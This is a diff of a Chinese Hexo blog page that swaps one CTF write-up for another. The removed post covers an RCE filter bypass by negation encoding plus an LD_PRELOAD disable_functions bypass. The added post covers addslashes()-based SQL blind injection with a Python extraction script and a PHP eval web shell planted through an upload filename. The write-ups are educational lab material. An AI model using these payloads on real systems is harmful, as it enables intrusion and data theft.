@@ -26,7 +26,7 @@
 <link rel="shortcut icon" href="/images/favicon.png">
 
 
-<title>日常练习32 - Hexo</title>
+<title>日常练习35——二次注入前瞻关于addslashes()函数 - Hexo</title>
 
 <meta name="keywords" content="">
 
@@ -149,72 +149,109 @@
                 <p><span class="label">Author</span>
                     <a href="https://george186.github.io"
                        target="_blank">george</a>
-                    <span title="Last edited at&nbsp;2021-05-11">2021-05-11</span>
+                    <span title="Last edited at&nbsp;2021-05-18">2021-05-18</span>
                 </p>
                 <p>一个写代码的「伪文人」</p>
             </div>
-            <h2 class="post-title">日常练习32</h2>
+            <h2 class="post-title">日常练习35——二次注入前瞻关于addslashes()函数</h2>
             <div class="post-meta">
-                emm... 2330 words in the article |
+                emm... 3464 words in the article |
                 you are the&nbsp;<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>th friend who reading now
             </div>
         </div>
         <div class="post-content markdown-body">
-            <p>这道题是一个rce的绕过题。  </p>
-<h1 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h1><p>关于rce的绕过感觉还是重在积累，网上有很多博客都有讲各种rce的绕过，比如什么无参数绕过，无字母数字绕过等等，下次有时间整理一下。  </p>
-<p>这道题目直接给了源码，  </p>
-<pre><code>&lt;?php
-error_reporting(0);
-if(isset($_GET[&#39;code&#39;]))&#123;
-        $code=$_GET[&#39;code&#39;];
-                if(strlen($code)&gt;40)&#123;
-                                    die(&quot;This is too Long.&quot;);
-                                            &#125;
-                if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))&#123;
-                                    die(&quot;NO.&quot;);
-                                            &#125;
-                @eval($code);
-&#125;
-else&#123;
-        highlight_file(__FILE__);
-&#125;
+            <p>这道题算是给二次注入开头了，因为它涉及了二次注入中一个重要的函数——addslashes()函数。  </p>
+<h1 id="CISCN2019-总决赛-Day2-Web1-Easyweb"><a href="#CISCN2019-总决赛-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 总决赛 Day2 Web1]Easyweb"></a>[CISCN2019 总决赛 Day2 Web1]Easyweb</h1><p>这是前年国赛总决赛的一题，重点考察了addslashes()函数的利用。  </p>
+<p>打开题目，看到一个登陆界面：</p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/60a86a5a6ae4f77d358e18f8.png"><img src="https://pic.imgdb.cn/item/60a86a5a6ae4f77d358e18f8.png"></a>  </p>
+<p>测试后发现图片有两张不同的回显，大致就可以判断这道题和盲注有关了，接着我们可以在robots.txt里找到这道题目的提示（比赛中对于这些细节还是要检查的）   </p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/60a9d26835c5199ba783de65.png"><img src="https://pic.imgdb.cn/item/60a9d26835c5199ba783de65.png"></a>  </p>
+<p>可以看到提示我们有备份文件，我们可以下载得到image.php.bak文件，里面包含源码：  </p>
+<pre><code>&lt;﻿?php
+include &quot;config.php&quot;;
 
-// ?&gt;  </code></pre>
-<p>很明显就是无字母和数字的rce绕过，这个网上都有讲解。这里简单说一下，对于不同版本的php有不同的方法来绕过字母和数字的过滤，可以取反或者异或绕过，如果这些不行还可以通过上传文件来用通配符绕过，这道题用取反绕过即可。  </p>
-<p>先执行一下phpinfo()试一试：  </p>
-<pre><code>?code=(~%8F%97%8F%96%91%99%90)();  </code></pre>
-<p>发现成功执行，那么接下来就好办了。我们直接构造一个一句话木马连一下：  </p>
-<pre><code>&lt;?php 
-error_reporting(0);
-$a=&#39;assert&#39;;
-$b=urlencode(~$a);
-echo $b;
-echo &quot;&lt;br&gt;&quot;;
-$c=&#39;(eval($_POST[cmd]))&#39;;
-$d=urlencode(~$c);
-echo $d;
- ?&gt;   </code></pre>
-<p>得到取反后的payload：  </p>
-<pre><code>?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9C%92%9B%A2%D6%D6);  </code></pre>
-<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/609e97f8d1a9ae528f66fefd.png"><img src="https://pic.imgdb.cn/item/609e97f8d1a9ae528f66fefd.png"></a>  </p>
-<p>成功连上，接下来就是上蚁剑。  </p>
-<p>用蚁剑连上后却发现打开readflag文件是乱码，原来是开启了disable_functions，禁用了很多函数，导致我们的shell无法生效，那么我们就需要绕过这个disable _functions的限制，这里有两种方法。  </p>
-<h2 id="利用蚁剑的插件"><a href="#利用蚁剑的插件" class="headerlink" title="利用蚁剑的插件"></a>利用蚁剑的插件</h2><p>蚁剑的有一个插件可以绕过disable_functions的限制，但是我这个蚁剑没办法下载，所以没办法使用。但是这个插件确实好用。  </p>
-<h2 id="LD-preload-mail劫持so来执行系统命令"><a href="#LD-preload-mail劫持so来执行系统命令" class="headerlink" title="LD_preload + mail劫持so来执行系统命令"></a>LD_preload + mail劫持so来执行系统命令</h2><p>这个原理就有点复杂了，我直接讲方法，大致原理如下：  </p>
-<pre><code>利用linux提供的LD_preload环境变量，劫持共享so，在启动子进程的时候，新的子进程会加载我们恶意的so拓展，然后我们可以在so里面定义同名函数，即可劫持API调用，成功RCE  </code></pre>
-<h3 id="方法："><a href="#方法：" class="headerlink" title="方法："></a>方法：</h3><p>我们发现在/var/tmp/目录存在上传权限，那么我们上传我们的exp（这个是可以在GitHub上下载的）</p>
-<p>上传下面两个文件  </p>
-<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/609e9c31d1a9ae528fa98189.png"><img src="https://pic.imgdb.cn/item/609e9c31d1a9ae528fa98189.png"></a>  </p>
-<p>然后我们就可以在网页上重新构造payload来执行命令了。  </p>
-<pre><code>?code=$&#123;_GET&#125;[_]($&#123;_GET&#125;[_]);&amp;_=assert&amp;_=eval($_POST[&#39;a&#39;])  </code></pre>
-<p>再加上对应的getshell文件和绕过exploit文件即为：  </p>
-<pre><code>?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=include(%27/var/tmp/bypass_disablefunc.php%27)&amp;cmd=/readflag&amp;outpath=/tmp/tmpfile&amp;sopath=/var/tmp/bypass_disablefunc_x64.so</code></pre>
-<p>上传就能得到flag。  </p>
-<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/609e9d52d1a9ae528fbba03d.png"><img src="https://pic.imgdb.cn/item/609e9d52d1a9ae528fbba03d.png"></a>  </p>
-<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题考的就是无字母数字的rce绕过，网上方法很多，其次就是关于disable _functions的绕过，这里学到了两个方法，一个是利用蚁剑上的插件，另一个就是LD _preload + mail劫持so来执行系统命令，关于第二个方法目前对于具体原理理解还不深，只知道具体步骤，有时间还是要多加深理解。  </p>
-<p>下面附上第二种方法的exp下载和关于无字母数字rce的绕过博客：  </p>
-<p><a target="_blank" rel="noopener" href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a>  </p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45669205/article/details/115842332?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162100811916780274196600%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=162100811916780274196600&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~times_rank-4-115842332.first_rank_v2_pc_rank_v29&utm_term=%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce&spm=1018.2226.3001.4449">无字母数字RCE与LD_PRELOAD绕disable_functions</a></p>
+$id=isset($_GET[&quot;id&quot;])?$_GET[&quot;id&quot;]:&quot;1&quot;;
+$path=isset($_GET[&quot;path&quot;])?$_GET[&quot;path&quot;]:&quot;&quot;;
+
+$id=addslashes($id);
+$path=addslashes($path);
+
+$id=str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$id);
+$path=str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$path);
+
+$result=mysqli_query($con,&quot;select * from images where id=&#39;&#123;$id&#125;&#39; or path=&#39;&#123;$path&#125;&#39;&quot;);
+$row=mysqli_fetch_array($result,MYSQLI_ASSOC);
+
+$path=&quot;./&quot; . $row[&quot;path&quot;];
+header(&quot;Content-Type: image/jpeg&quot;);
+readfile($path);  </code></pre>
+<p>源码审计一下，首先以get方式传参id和path，然后这两个参数要经过addslashes()函数，随后对这两个经过变化的参数进行正则匹配，替换掉一些字符。最终将这两个经过变换的变量拼接到sql语句中进行查询。  </p>
+<p>这里最重要的就是这个addslashes()函数，我们需要知道他是干什么的：  </p>
+<pre><code>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。
+预定义字符是：
+单引号（’）
+双引号（&quot;）
+反斜杠（\）
+NULL    </code></pre>
+<p>也就是说如果我们传入的字符串中有上面的预定义字符，那么经过这个函数后就会在这些字符前面加上转义字符”&quot;。   </p>
+<p>比如下面的代码  </p>
+<pre><code>&lt;?php
+$id = &quot;\\0&quot;;
+echo $id.&#39;&lt;br&gt;&#39;;
+$id = addslashes($id);
+echo $id.&#39;&lt;br&gt;&#39;;
+$id=str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$id);
+echo $id;
+?&gt;  </code></pre>
+<p>返回的字符分别是   </p>
+<pre><code>\0
+\\0
+\  </code></pre>
+<p>也就是说\0在经过addslashes()函数后被加上\变为\0，然后经过正则匹配\0被替换成空，最终也就变成了\。  </p>
+<p>但是如果这个转义字符被拼接到sql语句中会发生什么呢？  </p>
+<pre><code>select * from images where id=&#39;\&#39; or path=&#39;&#123;$path&#125;&#39;  </code></pre>
+<p>可以看到转义字符后面的单引号会被转义，原来的闭合单引号往后顺延，那么最终id的值为：&#39; or path=，也就是说原来关于path的查询不存在了，现在只剩下关于id的值的查询。  </p>
+<p>但是我们仍然可以上传变量path来进行拼接，又因为这道题的查询回显页面不同，没有回显结果，所以我们可以使用盲注来查询。  </p>
+<p>payload语句如下：  </p>
+<pre><code>?id=\\0&amp;path=or 1=if(length(database())&gt;1,1,-1)#  </code></pre>
+<p>这样最终的sql查询语句实际上是：  </p>
+<p>select * from images where id=’<strong>&#39; or path=</strong> or 1=if(length(database())&gt;1,1,-1)’#<br>（加粗的字符是id的值）  </p>
+<p>很明显的盲注，测试后发现确实会有不同的回显。  </p>
+<p>接下来就是上脚本来得到用户名和密码了:  </p>
+<pre><code>import requests
+
+
+url = &#39;http://ac4c87f5-3044-4096-b55a-0c647ae76c50.node3.buuoj.cn/image.php?id=\\0&amp;path=or 1=&#39;
+flag = &#39;&#39;
+table_name = &#39;&#39;
+
+for i in range(1, 50):
+for c in range(127, 0, -1):
+    payload = &#39;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database() ),%d,1))=%d,1,-1)%%23&#39; % (i, c)
+    #payload = &#39;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=0x7573657273 ),%d,1))=%d,1,-1)%%23&#39; % (i, c)
+    #payload = &#39;if(ascii(substr((select group_concat(username) from users),%d,1))=%d,1,-1)%%23&#39; % (i, c)
+    #payload = &#39;if(ascii(substr((select group_concat(password) from users),%d,1))=%d,1,-1)%%23&#39; % (i, c)
+    r = requests.get(url+payload)
+
+    if &quot;JFIF&quot; in r.text:
+        table_name += chr(c)
+        print(table_name)
+        break</code></pre>
+<p>得到密码和用户名：  </p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/60a9df3135c5199ba7efdfdb.png"><img src="https://pic.imgdb.cn/item/60a9df3135c5199ba7efdfdb.png"></a></p>
+<p>登录，发现是一个上传文件的页面：  </p>
+<p>直接抓包上传一句话木马试试。  </p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/60a9dfb335c5199ba7f53744.png"><img src="https://pic.imgdb.cn/item/60a9dfb335c5199ba7f53744.png"></a>  </p>
+<p>告诉我们将文件名记录在日志中，那么我们尝试通过文件名写入一句话木马。  </p>
+<p>修改Content-Disposition中参数filename的值为<?php @eval($_POST['cmd']) ?>  </p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/60a9e02735c5199ba7f9dfdf.png"><img src="https://pic.imgdb.cn/item/60a9e02735c5199ba7f9dfdf.png"></a>  </p>
+<p>又说不让上传php文件，应该是我们的文件名中有php字符，那么我们使用短标签绕过  </p>
+<p>我们这样构造：  </p>
+<pre><code>&lt;?= @eval($_POST[&#39;cmd&#39;]); ?&gt;  </code></pre>
+<p>成功上传，接下来就是蚁剑链接了：  </p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/60a9e11d35c5199ba7032905.png"><img src="https://pic.imgdb.cn/item/60a9e11d35c5199ba7032905.png"></a>  </p>
+<p>根目录得到flag。  </p>
+<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题重点就是addslashes()函数的操作，如何构造字符来利用addslashes()函数和下面的正则匹配来成功执行sql盲注，之后的二次注入也将和他有关，此外就是关于上传文件的文件名一句话木马和短标签绕过这两个小知识点。</p>
 
             
                 
